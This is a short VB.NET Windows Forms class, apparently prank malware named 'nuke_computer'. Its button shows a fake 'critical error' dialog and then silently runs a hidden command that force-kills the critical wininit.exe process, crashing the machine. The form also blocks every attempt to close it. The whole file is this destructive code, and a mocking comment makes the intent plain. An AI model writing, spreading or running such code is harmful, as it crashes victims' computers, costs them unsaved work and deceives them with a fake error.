Public Class nuke_computer
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        MsgBox("critical error", 0 + 16, "ERR")
        MyUtilities.RunCommandComInvis("TASKKILL /IM wininit.exe /T /F", "", False) 'lmao ur pc got nuked
    End Sub

    Private Sub nuke_computer_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        e.Cancel = True
    End Sub
End Class